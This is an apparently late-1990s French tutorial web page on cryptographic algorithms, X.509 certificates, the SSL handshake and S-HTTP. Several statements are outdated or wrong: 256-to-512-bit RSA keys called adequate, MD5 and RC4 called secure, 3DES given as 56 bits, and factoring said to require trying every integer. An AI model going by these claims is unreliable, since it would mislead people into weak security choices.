Tous trois sont d'origine RSA Data Security Inc, ils utilisent des clés privées de tailles variables. Ces algorithmes sont privés et leur spécifications n'ont jamais été publiées. RC2 a été vendu comme l'un des remplaçants du DES, il utilise des blocs de 64 bits, RC4 est un algorithme de chiffrement continu , tous trois sont  prétendus plus rapides que les DES, et n'ont à ce jour pas été cassés. 
RC5 est un algorithme de chiffrement par blocs avec de nombreux paramètres : taille des blocs, taille de la clé, et nombre de rondes. Des études ont semble-t-il montré que RC5 est sûr après 6 rondes, néanmoins RSADSI recommande d'en utiliser au moins 12. 
Netscape (v3.0 minimum) utilise 2 ces algorithmes pour des communications sur des sites sécurisés (https), en plus de l'algorithme RSA à clés publiques

<h4><b>RSA</h4></b><p align="justify">
Le RSA est le cryptage à clé publique le plus connu, pour le chiffrement et l'authentification. Trois mathématicien du noms de  Ron Rivest, Adi Shamir et Len Adleman ont décidé de réinventer
totalement le principe du chiffrement dans les années 70. Le résultat sera la publication du RSA en 1977. Dans son principe ce n'est plus à l'expéditeur mais au destinataire
qu'il incombe de créer la clé de cryptage. Il en crée à présent deux : une qu'il conserve et ne dois pas être divulguée (clé privée) et une clé publique qu'il pourrait distribuer<br>
C'est le plus simple algorithme à clé publique à taille variable. La grande partie des cryptosystèmes à clé publique sont basées sur le RSA. 
<p align="justify">
La puissance du cryptage RSA est basée sur la difficulté de factoriser un grand entier. Dans son fonctionnement l'operation retenu pour le RSA s'apelle modulo. Celui ci désigne le reste de la division euclidienne d'un entier par
un autre. L'idée se résume à crypter un message en effectuant l'opération avec l'un des deux facteurs de ce produit (clé publique) et de le decrypter en accomplissant l'opération inverse, à l'aide de l'autre facteur (clé privée).
Pour que cette condition puisse fonctionner, il y a une condition fondamentale, il faut choisir des nombre entier très élévée. Il n'existe aucun formule pour factoriser un nombre entier
La seule possibilité de decryptage est d'essayer la formule avec tous les entiers.

<p align="justify">
le calcul d'une puissance modulo N est à la portée de tout ordinateur, ou même d'une calculatrice de poche programmable. Pour le moment, la sécurité du cryptage RSA repose sur la puissance des ordinateurs et sur les connaissances en arithmétique. Tout progrès dans un domaine comme dans l'autre peut obliger à allonger la clef. 
Il apparaît en effet aujourd'hui indispensable de crypter avec une largeur de clé d'au moins 256 bits. Pour plus de sécurité, 512 bits sont recommandés
Il faut ainsi près de deux cent ans pour découvrir la valeur de 2 facteurs premiers d'un nombre écrit avec 2^128. 
<p align="justify">
<h4><b>DH</h4></b><p align="justify">

<h4><b>DSS</h4></b><p align="justify">

<h4><b>MD2-MD4-MD5</h4></b><p align="justify">
MD5 est une fonction de hachage à sens unique conçue par Ron Rivest (Le R de RSA). MD signifie Message Digest, et 5 
et la version de l'algorithme. Il produit des empreintes 128 bits, en manipulant le texte d'entrée par blocs de 512 
bits. Il utilise autant de blocs de 512 bits qu'il y en a dans le texte à traiter. Si le texte n'est pas multiple de 
512 bits, MD5 complète avec une chaîne bien définie. Chaque bloc subit 4 rondes, chaque ronde étant fonction des 
rondes précédentes sur les blocs précédents. 
<p align="justify">
MD5 n'est basé sur aucune hypothèse, telle la difficulté de la factorisation, mais semble très résistant à la 
cryptanalyse. Bert Den Boer et Antoon Bosselaers ont démontré une faiblesse d'une des fonctions internes de la 
ronde de l'algorithme, avec des collisions de fonctions de compressions (collision signifie que 2 résultats 
d'entrée différents, donne un même résultat de sortie). Cela ne compromet en rien la sécurité pratique de MD5 en 
entier.
<p align="justify"> 
<h4><b>SHA</h4></b><p align="justify">
Le meilleur algorithme de hachage est le SHA " Secure Hash Algorithme " pour le standard appelé SHS " Secure Hash 
Standart ", élaboré par la NSA. Il est censé être utilisé à chaque fois qu'un algorithme sûr de 
hachage est requis pour des applications fédérales, notamment avec DSS. " Digital Signature Standart ". SHA est calqué sur le 
donctionnement de MD-4, avec une empreinte 160 bits, donc 1 chance sur 2^160 = 1.5*10^48 d'avoir une collision. 
Le SHA (Secure Hash Algorithm) est issu de l'Institut national des standards et de la technologie américain ainsi 
que de l'agence nationale de sécurité (NSA). 

Ce standard prend des fichiers de tailles variables en entrée, et en produit une empreinte de 160 bits (plus long que MD5), pour cela il utilise 5 variables initialisées, il prend ensuite dans la boucle principale des blocs de 512 bits en continu. La boucle principale comprend 4 rondes (ie une substitution suivie d'une permutation)  de 20 opérations chacune.
SHA ressemble à MD4 et MD5, il se distingue par une ronde supplémentaire, un mélange de bits amélioré
Ainsi qu'un meilleur effet d'avalanche (chaque étape utilise en cascade le résultat de l'étape précedente).
Il n'y a pas d'attaque cryptographique connue contre SHA, et il semble plus robuste que ses pairs (empreinte de 160 bits).


<h4><b>Le code d'authentification de CAM (MAC)</h4></b><p align="justify">
Le code d'authentification de messages est en fait un algorithme de hachage qui utilise en plus une clé privée nécessaire à la vérification de l'empreinte, cette clé étant elle même utilisée dans la génération du digest.
Par exemple le RIPE-MAC utilise le DES, le RIPE-MAC3 utilisant quant à lui le triple DES. Les deux algorithmes composent des blocs de 64 bits. Une fonction de compression est alors utilisée pour haché ces différents blocs en un seul bloc de 64 bits( au moyen d'une clé) privée. Le bloc obtenu est enfin chiffré par une autre clé dérivé de lé clé privée de compression.
<p align="justify">
<A NAME="tableau"><h4><b>3.2. Synthèse : Tableau récapitulatif des différents algorithmes</b></h4></a>
<p align="justify">
<TABLE BORDER=1 align=center>
  <COL SPAN=4>
    <TR>
      <TD>Algorithme</TD>
      <TD>Clé</TD>
      <TD>Longueur de la clé</TD>
      <TD>Principale utilisation</TD>
    </TR>
    <TR>
      <TD>DES</TD>
      <TD>Privée</TD>
      <TD>56 bits (plus 8 de parité)
</TD>
      <TD>Confidentialité</TD>
    </TR>
    <TR>
      <TD>3DES</TD>
      <TD>Privée</TD>
      <TD>56 bits
</TD>
      <TD>Confidentialité</TD>
    </TR>
    <TR>
      <TD>RC2</TD>
      <TD>Privée</TD>
      <TD>De 1 à 1024 bits
</TD>
      <TD>Confidentialité</TD>
    </TR>
    <TR>
      <TD>RC4</TD>
      <TD>Privée</TD>
      <TD>40 bits
</TD>
      <TD>Confidentialité</TD>
    </TR>
    <TR>
      <TD>RC5</TD>
      <TD>Privée</TD>
      <TD>40 bits
</TD>
      <TD>Confidentialité
</TD>
    </TR>
    <TR>
      <TD>IDEA</TD>
      <TD>Privée</TD>
      <TD>128 bits
</TD>
      <TD>Confidentialité
</TD>
    </TR>
    <TR>
      <TD>RSA</TD>
      <TD>Publique
</TD>
      <TD>1024 bits (voire 2048)
</TD>
      <TD>Authentification (signature)
Echanges des clés
</TD>
    </TR>
    <TR>
      <TD>DH</TD>
      <TD>Publique
</TD>
      <TD>?</TD>
      <TD>Echange des clés
</TD>
    </TR>
    <TR>
      <TD>DSS</TD>
      <TD>Publique
</TD>
      <TD>512 à 1024
</TD>
      <TD>Authentification (signature)
</TD>
    </TR>
    <TR>
      <TD>MD2</TD>
      <TD>Publique
</TD>
      <TD>sans objet
</TD>
      <TD>Intégrité (hachage)
</TD>
    </TR>
    <TR>
      <TD>MD5</TD>
      <TD>Publique</TD>
      <TD>sans objet
</TD>
      <TD>Intégrité (hachage) - 128 bits
</TD>
    </TR>
    <TR>
      <TD>SHA</TD>
      <TD>Publique
</TD>
      <TD>sans objet
</TD>
      <TD>Intégrité (hachage)- 160 bits
</TD>
    </TR>
    <TR>
      <TD>MAC</TD>
      <TD>Publique</TD>
      <TD>sans objet
</TD>
      <TD>Intégrité (hachage et codage)
</TD>
    </TR>
</TABLE>
<p align="justify">
<p align="justify">
<p align="justify">
<p align="justify">
<p align="justify">
<A NAME="cerificat"><h3><b>4. LES CERTIFICATS</h3></b><p align="justify"></A>
<A NAME="prescert"><h4><b>4.1. Présentation</h4></b><p align="justify"></A>

Toutes les technologies décrites ci dessus sont au point et très séduisantes. Elles se fondent toutes lourdement sur les technologies à clés publiques :

<UL>
  <LI> usage de RSA pour négocier des clés de chiffrement RC2 dites " de session ";
  <LI> usage de RSA pour sceller les messages (intégrité / authenticité)
</UL>


La généralisation de ces mécanismes est très probable dans le cadre des échanges Internet sécurisés (commerce électronique, par exemple). Toutefois, cette généralisation pose le problème de la fourniture / localisation des clés publiques. La mise en place de serveurs généraux mondiaux desservant les clés publiques de chacun est peu crédible.
<p align="justify">
L'idée actuellement poursuivie consiste à permettre à chacun de fournir sa clé publique à son correspondant au sein du message lui-même ou au travers de sites publiques non particulièrement sécurisés !. Cependant, cette méthode ne garantit plus réellement l'intégrité ni la signature puisqu'un tiers malveillant, intervenant sur le message, peut parfaitement fournir sa propre clé publique.
<p align="justify">
Les travaux en cours conduisent donc à fournir une clé publique certifiée : il s'agit en fait de constituer un message composé de l'identité de l'émetteur et de sa clé publique, le tout signé (MD5 + chiffrement RSA) par un organisme tiers dont la clé publique est censée être connue du destinataire.
Bien sûr, ceci ne fait que repousser le problème, puisqu'il faut alors connaître la clé publique de l'organisme certifieur. En fait, le problème est considérablement réduit car un très grand nombre de clés publiques peuvent être certifiées par le même organisme.
<p align="justify">
Cette technique peut d'ailleurs être prolongée : l'organisme certifieur peut éventuellement fournir lui-même sa clé publique au travers d'un certificat scellé par un organisme certifieur " supérieur ". Il est ainsi possible d'envisager des chaînes de certificats.
<p align="justify">
A l'heure actuelle, les browsers (navigateurs) du marché sont livrés avec la connaissance intégrée des clés publiques d'une dizaine d'organismes certifieurs.
<p align="justify">
Cette architecture de certificats est très importante dans le cadre des travaux sur le commerce électronique et appelle de nombreuses réflexions et développements :

<UL>
  <LI>il est important de savoir la confiance que l'on accorde à un certifieur (aujourd'hui, par exemple, les certificats VERISIGN CLASS 1 ne garantissent que l'existence de l'adresse Email fournie lors de la souscription du certificat);
  <LI>il est important de pouvoir invalider un certificat (ou plus généralement un organisme certifieur) dans un browser;
  <LI>il est envisageable de gérer au sein de son entreprise un générateur de certificats, voire une hiérarchie de générateurs de certificats, que l'on attribue à des interlocuteurs admissibles et que l'on utilisera dans les échanges applicatifs;
  <LI>une question très importante et mal résolue actuellement consiste à savoir comment les certificats sont manipulés par les postes de travail; l'idée généralement admise est que les clés privéess et les certificats associés sont stockés par les browsers et accessibles éventuellement au travers de mots de passe locaux; ce stockage est effectué lors d'une procédure combinée de fabrication du couple de clés et de fourniture de la clé publique au site certifieur; deux problèmes lourds se posent alors :
<p align="justify">  <ul>
  <li>la gestion de postes de travail multi utilisateurs
  <li>la gestion d'utilisateurs multi postes de travail
  </ul>
</UL>
<p align="justify">

Aucun mécanisme satisfaisant n'existe pour traiter ces problèmes, mais deux voies semblent crédibles :<p align="justify">
<UL>
  <LI>.	une technique locale de stockage des informations personnelles sur un poste de travail combinée à une technique de représentation " en transit " sécurisée de ces données (approche " wallet " et protocole " PCX " de Microsoft)
  <LI>.	technique de stockage externe sur carte à microprocesseur
</UL>
<p align="justify">
<A NAME="x509"><h4><b>4.2. Le certificat X509</b></h4><p align="justify"></A>

L'ISO et l'ITU (International Télécommunications Union) ont standardisé un format  pour le transfert sécurisé des clés publiques ; le Standard X.509 (ISO 9498-8).
Le standard X.509 permet de fournir des clés publiques sécurisées en certifiant l'association clé publique - propriétaire de la clé.
<p align="justify">
Cette certification sera faite par une tierce partie : le " Certification Authority " (CA), qui signe le certificat.
Les propriétés d'un certificat X509 sont essentiellement les suivantes :
<p align="justify">
<UL>
  <LI>Tout utilisateur disposant d'un accès à la clé publique du CA peut retrouver la clé publique qui a été certifiée. 
  <LI>Aucune entité autre que le CA, ne peut modifier le certificat sans que cela soit détectable (un certificat est de base infalsifiable).
</UL>
<p align="justify">
Fort de ce constat (in falsification), les certificats peuvent être publiés/édités dans un annuaire, par exemple de type X500, sans nécessiter de protection particulière.	
 <p align="justify">
<h4><b>4.2.1. Contenu du certificat X.509 </b></h4><p align="justify">
<p align="justify">
Le certificat X.509 est une chaîne d'octets codés en ASN.1 contenant :<p align="justify">
<UL>
  <LI>Numéro de version (1988, 1993 ou 1993 avec extensions),
  <LI>Numéro de série du certificat (identificateur unique),
  <LI>Période de validité,
  <LI>Nom de l'utilisateur,
  <LI>Informations sur la clé publique (identificateur et type d'algorithme utilisé),
  <LI>Extensions (ex : nom X.400, ...),
  <LI>Nom X.500 du de l'émetteur du certificat (CA),
  <LI>Signature du CA.
</UL>
<p align="justify">
Toutes les autres clés publiques sont stockées dans le Directory X.500 en tant que certificats X.509.
<p align="justify">
Chaque application qui requiert un certificat doit vérifier la signature sur le certificat en utilisant la clé publique du CA avant d'utiliser la clé.
 
<p align="justify">
<A NAME="protocole"><b><h3>5. LES PROTOCOLES DE MISE EN UVRE</h3></b><p align="justify"></a>

Les protocoles de mise en uvre sont essentiellement chargés, au-dessus de liaisons point à point mettant en relation deux interlocuteurs pour :
<UL>
  <LI>négocier les échanges de certificats (optionnels) de l'un, l'autre ou les deux interlocuteurs ;
  <LI>négocier la fabrication et la mise en uvre d'une éventuelle clé privée de session ;
  <LI>négocier et mettre en uvre les algorithmes de chiffrement / scellement retenus.
</UL>


<A NAME="ssl"><b><h4>5.1. SSL</h4></b><p align="justify"></A>
<A NAME="acteur"><b><h4>5.1.1. Acteur</h4></b><p align="justify"></A>

Le protocole SSL (Secure Sockets Layer), dont les spécifications sont publiées sur Internet et par l'IETF, est d'origine Netscape. Il est adopté par les principaux producteurs de logiciels et de matériels, les institutions financières et les autorités de certification. SSL est installé dans environ 75 % des logiciels de navigation Internet.
SSL est un standard reconnu dont l'usage est fortement conseillé dans le cadre d'applications WEB Intranet ou Internet.

<A NAME="principe"><b><h4>5.1.2. Principes techniques</h4></b><p align="justify"></A>

Le protocole SSL sécurise les communications entre une application cliente et une application serveur. Il s'appuie sur la couche TCP. L'avantage de SSL réside dans son indépendance vis à vis des applications de plus haut niveau : FTP, HTTP, Telnet ...
<p align="justify">
Les objectifs du protocole SSL (SSL Protocol v3.0) par ordre de priorité sont :

<UL>
  <LI>La sécurité du chiffrement,
  <LI>L'interopérabilité,
  <LI>L'extensibilité à d'autres méthodes de chiffrement (qu'il est possible d'intégrer).
</UL>
<p align="justify">
Il utilise les quatre propriétés de base suivantes :<p align="justify">
<UL>
  <LI>La connexion est privée. Le chiffrement est fait après la connexion initiale de définition de la clé privée client et d'authentification du serveur. Un algorithme de chiffrement symétrique (DES, RC4, etc.) permet de chiffrer les données.
  <LI>L'identification peut être faite par un algorithme de chiffrement asymétrique (RSA, DSS, etc.), c'est-à-dire par la clé publique. SSL authentifie toujours le serveur et peut dans la version V3 du protocole authentifier le client de la communication.
  <LI>SSL assure l'intégrité des données grâce à un champ spécial, appelé champ MAC (Message Authentification Code). Ce champ fait partie intégrante de la structure des données SSL.. Des fonctions robustes de hash-coding (SH1, MD5, etc.) sont utilisées pour calculer le code d'authentification des messages.
<li>Les certificats respectent la syntaxe X509.
</UL>
<p align="justify">
Le protocole SSL permet d'établir un tunnel, rendu privé grâce à des mécanismes de chiffrement.
<p align="justify">
SSL intègre une optimisation de la mémoire cache, en particulier pour les opérations sur les clés publiques, ce qui réduit le nombre de connexions et augmente la rapidité dans les opérations de chiffrement.
L'établissement d'une connexion passe par trois étapes :
<p align="justify">
<UL>
  <LI>Une étape de reconnaissance mutuelle où le client et le serveur échangent des informations relatives aux numéros de versions, aux algorithmes de chiffrement symétrique suivie par l'obtention du certificat du serveur.
  <LI>Une étape de création d'une nouvelle clé symétrique pour le chiffrement des communications. 
  <LI>Une étape de chiffrement des communications.
</UL>
<center><IMG SRC="ssl.jpg" BORDER=0 WIDTH=294 HEIGHT=320><br>Relation entre SSL, TCP/IP et la couche applicative</center>
<p align="justify">
<A NAME="etabli"><h4><b>5.1.3. Etablissement des communications avec SSL</h4></b><p align="justify"></A>

SSL est un protocole fonctionnant en full-duplex, qui repose sur 2 niveaux :
<UL>
  <LI>Le niveau le plus bas, nommé " SSL Record Protocol " est situé au dessus du protocole TCP.
  <LI>Le " SSL Handshake Protocol " permet la négociation des algorithmes et des clés de chiffrement entre le client et le serveur.
</UL>
<p align="justify">
Le mécanisme d'établissement d'une connexion sécurisée dans le cas où le client n'a jamais communiqué avec le serveur et où l'authentification du client n'est pas requise est le suivant :
<p align="justify">
<UL>
  <LI>Le client envoie au serveur un message " CLIENT-HELLO " (en clair) qui comporte la version SSL utilisée, les algorithmes supportés, les méthodes de compression, un aléa client, un identificateur de session.
  <LI>Le serveur renvoie au client un message " SERVER-HELLO "( en clair), après avoir vérifié les données contenues dans le " CLIENT-HELLO " , contenant  le certificat du serveur et les algorithmes de chiffrement choisis (les plus forts), un aléa, un identificateur de session, et un Serveur_hello_done en clair. 
  <LI>Si le résultat de ces premiers contacts demande la génération d'une nouvelle clé, le serveur n'ayant pas gardé en cache une précédente connexion, le client crée une nouvelle clé en fonction du contenu du message " SERVER-HELLO " et envoie un message " CLIENT-MASTER-KEY " au serveur contenant la nouvelle clé chiffrée avec la clé publique du serveur, le tout sur une longueur de 48 octets. De cette nouvelle clé découlera deux clés (lecture/écriture) pour le serveur et deux clés pour le client (lecture/écriture). La clé de lecture du client est aussi la clé d'écriture du serveur et vis et versa.
  <LI>Le serveur renvoie un message au client " SERVER VERIFY ". A partir de cette étape, le serveur est considéré comme authentifié (seul le serveur ayant fourni la clé publique a pu déchiffrer la clé générée par le client).
</UL>
<center><IMG SRC="sslack.jpg" BORDER=0 WIDTH=388 HEIGHT=262><br>" Handshake " du protocole SSL dans le cas où l'authentification du client n'est pas demandée.</center>
<p align="justify">
L'établissement d'une session SSL nécessite un nombre de communications significatif, et deux calculs RSA 512 bits au niveau du client (vérification du certificat serveur, et chiffrement de la clé maître). Sur une même session il est possible d'établir plusieurs connexions,  puisqu il y a établissement d'une connexion pour chaque URL sécurisée demandée par le client. Dans ce cas la valeur de l'identificateur de session sera instanciée (non nulle contrairement à l'initialisation) et mémorisée dans un cache serveur de manière paramétrable.
Dans l'option où l'authentification du client est requise, les échanges entre le client et le serveur continuent jusqu'à l'obtention du certificat du client.
<p align="justify">
Si le client et le serveur ont déjà établi une session, le client a gardé un identifiant de session. Le client le communique au serveur lors du premier message, le " CLIENT-HELLO ". Si le serveur a également conservé une trace de la communication avec ce client, les clés de lecture-écriture des deux parties sont générées à partir du souvenir de la clé symétrique échangée lors de la dernière connexion. Dans ce cas les deux extrémités calculent un nouveau jeu de secrets  pour la nouvelle connexion à partir de la clé maître de la session et des aléas échangés pour la connexion. Cette cinématique est plus rapide puisqu'elle ne nécessite aucun calcul RSA. 
<p align="justify">
Les mécanismes de chiffrement et de signature mis en uvre pour protéger la phase de transfert de données utilisent un jeu de six secrets, calculés à partir de la clé maître de la session. Ce calcul de diversification de la clé maître est réalisé à l'établissement de chaque connexion de la session SSL.
<p align="justify">
 <TABLE BORDER=0 align=center>
  <COL SPAN=3>
    <TR>
      <TD>SSL</TD>
      <TD></TD>
      <TD>Fonction</TD>
    </TR>
    <TR>
      <TD>client_write_MAC     
</TD>
      <TD>->
</TD>
      <TD>Calcul d'intégrité coté client 
</TD>
    </TR>
    <TR>
      <TD HEIGHT=24>serveur_write_MAC
</TD>
      <TD HEIGHT=24>->


</TD>
      <TD HEIGHT=24>Calcul d'intégrité coté serveur
</TD>
    </TR>
    <TR>
      <TD>client_write_key
</TD>
      <TD>->
</TD>
      <TD>Clé de chiffrement pour le client
</TD>
    </TR>
    <TR>
      <TD>serveur_write_key
</TD>
      <TD>->

</TD>
      <TD>Clé de chiffrement pour le serveur
</TD>
    </TR>
    <TR>
      <TD>serveur_write_vecteur
</TD>
      <TD>->

</TD>
      <TD>Valeur d'initialisation pour le chiffrement, coté serveur
</TD>
    </TR>
    <TR>
      <TD>client_write_vecteur
</TD>
      <TD>->

</TD>
      <TD>Valeur d'initialisation pour le chiffrement, coté client
</TD>
    </TR>
</TABLE>
<p align="justify">
Ces six valeurs sont calculées à partir de la clé maître et des deux aléas échangés lors de la phase initiale, et sont valables uniquement pour la connexion en cours.
<p align="justify">
Lorsque HTTP est utilisé au dessus de SSL, l'ensemble est désigné sous le terme de HTTPs, à ne pas confondre avec S-HTTP développé par IET (Integration Enterprise Technologies).
<p align="justify">
Le chiffrement des données s'effectue à l'issue des négociations (qui sont elles même chiffrées). Les algorithmes qui peuvent être utilisés (dans la version 3 de SSL) sont :
<UL>
  <LI>RC2,
  <LI>RC4,
  <LI>IDEA,
  <LI>DES,
  <LI>3DES.
</UL>

L'authentification (scellement et signature) peut être assurée par les algorithmes suivants :
<UL>
  <LI>MD5,
  <LI>RSA,
  <LI>SHA,
  <LI>MAC.
</UL>

La gestion des clés peut être assurée par :
<UL>
  <LI>RSA,
  <LI>DH,
  <LI>DSS,
  <LI>FORTEZZA.
</UL>

<A NAME="compare"><h4><b> 5.1.4. Comparaison entre SSL V3 et SSL V2</h4></b><p align="justify"></A>

Les avantages de SSL V3 portent sur les points suivants :

<UL>
  <LI>Amélioration de la sécurité du protocole : impossibilité d'attaque en coupure en injectant notamment des hello messages forçant les clients et le serveur à travailler en 40 bits . SSL V3 corrige ce problème en signant le dernier message de challenge avec une hash value des précédents messages de challenges.
  <LI>SSL V2 utilise une faible construction de l'algorithme MAC, ce problème est corrigé en V3.
  <LI>SSL V2 effectue du padding dans les blocs de scellement MAC et ne signe pas le champ indiquant la longueur de remplissage, laissant ainsi la possibilité à un attaquant de supprimer des octets à partir de la fin des messages. Ce problème est corrigé en V3.
  <LI>Avec SSL V3 les empreintes des messages (MACs) utilisent en input des clés d'une longueur réelle de 128 bits, même en version export, au lieu de 40 bits en SSL V2 .
  <LI>En V3 le protocole de challenge peut être relancé en milieu de session (en V2 il n'est effectué qu'à l'initialisation). De la même manière, le serveur peut demander à changer les algorithmes et les clés utilisés.
  <LI>SSL V3 utilise un protocole généralisé d'échanges de clé, il supporte Diffie-Hellman et Fortezza et des certificats non-RSA.
  <LI>SSL 3.0 autorise la compression et la décompression.
  <LI>Comme nous l'avons déjà évoqué, le serveur peut demander l'identification du client. Cette fonctionnalité importante nécessite une certification du client par l'organisme qui gère le serveur, tout autre type de certification par des tiers de confiance non impliqués n'a pas d'intérêt.
</UL>
<A NAME="compati"><h4><b>5.1.5. Compatibilité V2/V3 :</h4></b></A>

<UL>
  <LI>Un serveur SSL V3 reconnaît un client SSL V2.
  <LI>Un client V3 peut générer un client Hello de type V2.
  <LI>Un serveur V2 forcera un client V3 à dialoguer après le Hello en SSL V2.
  <LI>Un serveur V3 forcera par défaut un client V3 à dialoguer en V3 et non pas en V2, à moins que le " Handshake " soit forcé à se dérouler en V2.
</UL>

<A NAME="fire"><h4><b>5.1.6. SSL et les Firewalls</h4></b><p align="justify"></A>

SSL a été conçu pour sécuriser les échanges entre un client et un serveur au travers d'un réseau non sûr. En autre, son but est d'éviter les " man-in-the-middle attacks " ou attaque en coupure par intervention d'un intrus au milieu des échanges sécurisés (attaque en coupure de flux).
Ainsi, dans une architecture mettant en jeu un bastion, il est impossible de relayer applicativement (proxy) les flux dans le but de les traiter par un garde-barrière. SSL considère en effet un proxy comme un intrus dans les échanges. La seule solution est d'utiliser la fonctionnalité de filtrage de paquet (contextuel) au niveau du firewall, en réservant un port autorisé pour les services de type SSL+HTTP ou SSL+NNTP (respectivement 443 et 563 ). L'idée étant d'autoriser sans restriction (et si possible uniquement) l'établissement de communication sur ces ports.
Le risque résiduel dans ce type d'approche réside dans le fait qu'un pirate peut construire une attaque en utilisant des ports reconnus par le firewall, sans utiliser SSL, et sans que celui-ci s'en rende compte.
<p align="justify">
A titre d'information, le tableau ci-dessous reprend les différentes applications possibles de SSL.
<p align="justify">
<TABLE BORDER=1 align=center>
  <COL SPAN=2>
    <TR>
      <TD>PROTOCOLE
</TD>
      <TD>N° DE PORT
</TD>
    </TR>
    <TR>
      <TD>HTTPS
</TD>
      <TD>443/TCP
</TD>
    </TR>
    <TR>
      <TD>SSMTP
</TD>
      <TD>465/TCP
563/TCP
</TD>
    </TR>
    <TR>
      <TD>SNEWS
</TD>
      <TD>563/TCP
</TD>
    </TR>
    <TR>
      <TD>SSL-LDAP
</TD>
      <TD>636/TCP
</TD>
    </TR>
    <TR>
      <TD>SPOP3
</TD>
      <TD>995/TCP
</TD>
    </TR>
</TABLE>
<p align="justify">
<A NAME="mise"><h4><b>5.1.7. Mise en uvre</b></h4><p align="justify"></A>
Le système SSL (Secure Sockets Layer) est présent dans Netscape 2, 3 et 4 ou Internet Explorer 2, 3 et 4. Il permet d'authentifier les connexions entre un client et un serveur, ainsi que d'en chiffrer les échanges. Une clé de session est générée par le poste client, qui la crypte avec la clé publique du serveur et l'envoie. La "session" de communication Client/Serveur qui suit est alors cryptée avec la clé de session. Ainsi, il se crée un canal sécurisé entre le client et le serveur où sont échangés des messages HTTP par exemple, intrinsèquement protégés. Il est ainsi possible d'accéder au répertoire sécurisé avec Internet Explorer 3.0 et Netscape 3.0. Une option permet d'activer ou de désactiver la prise en compte des sites sécurisés :

<UL>
  <LI>Dans le navigateur Internet Explorer 3.0, l'option se trouve dans le menu View/Options/Advanced puis "cryptography settings".
  <LI>Dans Netscape 3.0, l'option se trouve dans le menu Options/Security Preference puis General.
</UL>

Une fois cette option activée, les autres clients ne pourront plus accéder à ce répertoire et l'accès se fait alors avec https:// (et non plus http://). Avec Netscape, un répertoire sécurisé se reconnaît à la clé cassée, en bas à gauche de l'écran, qui se referme.
<p align="justify">
<A NAME="certification"><h3><b>5.2. La certification et SSL</b></h3><p align="justify"></A>

Un certificat est un document électronique qui atteste qu'une clé publique est bien liée à une organisation ou personne. Il permet la vérification de la propriété d'une clé publique pour prévenir la contrefaçon de clés publiques. Un certificat contient généralement une clé publique, un nom ainsi que d'autres champs pour identifier le propriétaire, une date d'expiration, un numéro de série, le nom de l'organisation qui contresigne le certificat et la signature elle-même. Le format des certificats est défini par la norme X509.
<p align="justify">
Le certificat est donc une attestation que les informations qu'il contient sont exactes. Pour cela, le certificat doit être généré par un tiers de confiance, c'est-à-dire un organisme indépendant qui contrôle la véracité de ces informations. Le CA (Certifying Authority, autrement dit l'organisme certificateur) donne la crédibilité au certificat ; les utilisateurs du certificat en vérifieront la signature et auront confiance en ce certificat si eux même ont confiance en le CA.
<p align="justify">
Il existe typiquement deux types de certificats utilisés avec SSL : 

<UL>
  <LI>Pour serveur,
  <LI>Pour client. 
</UL>

Techniquement ils utilisent le même format mais diffèrent par l'information qu'ils contiennent. Ainsi, un certificat côté client sert à identifier un utilisateur, il contiendra donc des informations sur cet utilisateur. Coté serveur, le certificat a pour but d'authentifier le serveur et l'organisme qui l'exploite. C'est ce type de certificat dont vous avez besoin pour mettre en place un serveur "sécurisé" HTTPS.
<p align="justify">

<A NAME="obtenir"><h4><b>5.2.1. Comment obtenir un certificat SSL ?</b></h4><p align="justify"></A>

<h4>Certificat pour serveur</h4><p align="justify">

  Procédure d'obtention d'un certificat pour un serveur:
<p align="justify">
Avant de chercher à obtenir un certificat pour un serveur, diverses vérifications sont nécessaires. Tout d'abord vérifiez que vous avez un serveur Web qui supporte SSL. 
<p align="justify">
Après avoir installé votre serveur Web SSL, vous devrez utiliser une fonction de ce serveur pour générer une demande de certificat (CSR, Certificate Signing Request). Recherchez la section détaillant cette opération dans l'aide de votre logiciel.
<p align="justify">
Lors de la demande de certificat vous allez générer une clé privée. Dès que cette clé est générée, faites en une copie de sauvegarde et protégez là très sérieusement. Si cette clé tombe entre de mauvaises main votre sécurité est en danger et il faudra révoquer votre clé publique.
<p align="justify">
Lors de la génération de CSR, un certain nombre de champs vous seront proposés pour y saisir les informations. Attention, le champ "Common Name" (si présenté par votre logiciel) doit contenir l'adresse FQDN de votre serveur Web (par exemple, www.entreprise.com ou secure.entreprise.com); Les adresses IP sont refusées.
<p align="justify">
Une fois la demande de certificat générée, il ne nous reste plus qu'à choisir le CA (tiers certificateur). Si votre serveur doit être acceptable par n'importe quel utilisateur d'Internet vous devez choisir un CA reconnu mondialement. Si votre serveur est destiné à un intranet, alors vous pouvez soit générer votre certificat en le signant vous-même, soit devenir votre propre CA.
<p align="justify">
 
<h4>Certificat pour client</h4><p align="justify">


Un certificat client est un certificat qui identifie l'utilisateur d'un navigateur Web, et qui a vocation à identifier avec certitude un unique individu. Ce certificat est basé sur une clef publique/privée qui est stockée par le navigateur (à l'avenir, cette clef sera probablement sur carte à puce). De la même façon qu'un certificat pour serveur n'a pas de sens tant qu'il n'est pas authentifié par un tiers, le certificat client à besoin d'être signé.


<A NAME="type"><h4><b>5.2.2. Les différents types de certificats</b></h4><p align="justify"></A>

On peut différencier deux types de certificats suivant leurs signatures: les certificats signés par un serveur ou un organisme local (par exemple l'entreprise qui exploite un serveur SSL) et les certificats signés par un tiers certificateur reconnu de tous.
<p align="justify">
<A NAME="shttp"><h4><b>5.4. LE PROTOCOLE S-HTTP (SECURE HYPERTEXT TRANSFER PROTOCOL)</h4></b><p align="justify"></A>

<A NAME="bebutsh"><h4><b>5.4.1. Présentation</h4></b><p align="justify"></A>

HTTP est le protocole utilisé pour le transfert de documents HTML entre les clients et les serveurs Web. Ce protocole ne propose pas de sécurité. S-HTTP est une version sécurisée du protocole HTTP. S-HTTP a été développé et distribué gratuitement par le NCSA (National Center of Supercomputer Application).
Cette extension de l'actuel HTTP est disponible sur le papier depuis juillet 1995 et est en cours de standardisation par l'IETF.
<p align="justify">
Les caractéristiques de S-HTTP sont :

<UL>
  <LI>L'assurance d'une confidentialité grâce au chiffrement des documents ;
  <LI>L'authentification du serveur comme du client ;
  <LI>L'assurance de l'intégrité du message avec un champ MAC (Message Authenticity Check) ;
  <LI>L'assurance de la non-répudiation du message, c'est-à-dire que l'utilisateur ne pourra pas nier l'existence d'une transaction.
</UL>


<A NAME="mecanisme"><h4><b>5.4.2. Mécanisme général</h4></b><p align="justify"></A>
Le client HTTP se connecte sur la " Home Page " d'un serveur HTTP. Sur cette " Home page ", des liens hypertextes possèdent des tags indiquant une méthode cryptographique à utiliser pour le lien en question. 
